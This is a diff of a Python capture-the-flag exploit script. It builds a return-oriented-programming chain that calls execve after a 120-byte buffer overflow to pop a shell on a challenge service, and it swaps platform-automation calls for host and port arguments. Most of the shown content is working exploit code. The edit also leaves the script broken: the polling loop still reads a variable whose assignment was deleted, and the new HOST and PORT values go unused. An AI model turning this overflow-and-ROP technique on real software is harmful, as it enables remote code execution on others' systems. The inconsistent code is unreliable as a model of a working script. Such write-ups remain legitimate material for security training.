@@ -5,8 +5,6 @@
 #
 import sys, json, re, time, socket, struct
 sys.stdout.reconfigure(encoding="utf-8", errors="replace")
-sys.path.insert(0, r".")
-from cylab2 import CyLab
 
 POP_RDI = 0x40206F
 POP_RSI = 0x40A0DE
@@ -28,6 +26,14 @@ chain += p64(POP_RDX_RBX) + p64(16) + p64(0)
 chain += p64(POP_RAX) + p64(0)
 chain += p64(SYSCALL)
 # execve(BSS, 0, 0)
+
+# Service : demarrer l'instance depuis la plateforme du challenge, puis passer
+# l'hote et le port (ou l'URL) en argument de ce script.
+_A = sys.argv[1:]
+HOST = _A[0] if len(_A) > 0 else ""
+PORT = int(_A[1]) if len(_A) > 1 else 0
+url = _A[0] if _A else ""
+
 chain += p64(POP_RDI) + p64(BSS)
 chain += p64(POP_RSI) + p64(0)
 chain += p64(POP_RDX_RBX) + p64(0) + p64(0)
@@ -36,13 +42,9 @@ chain += p64(SYSCALL)
 payload = b"A" * 120 + chain
 print("payload len:", len(payload))
 
-cy = CyLab(delay=1.0)
-cy.login()
-cy.req("PUT", "/api/challenges/90/instance/?source=library")
 host = port = None
 for _ in range(12):
     time.sleep(2)
-    st, b = cy.req("GET", "/api/challenges/90/instance/")
     d = json.loads(b) if b.startswith("{") else {}
     if d.get("status") == "RUNNING":
         m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d+)", d.get("description") or "")
